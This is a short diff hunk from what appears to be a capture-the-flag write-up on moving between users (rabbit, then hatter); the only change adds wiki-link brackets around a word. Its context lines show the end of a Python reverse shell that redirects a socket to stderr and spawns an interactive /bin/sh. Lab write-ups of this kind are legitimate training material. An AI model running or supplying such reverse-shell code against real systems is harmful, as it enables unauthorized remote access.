@@ -66,7 +66,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-Now when the python code is run using sudo to change to the user `rabbit` we gain a shell as `rabbit`:
+Now when the [[python]] code is run using sudo to change to the user `rabbit` we gain a shell as `rabbit`:
 
 ## Rabbit > Hatter
 
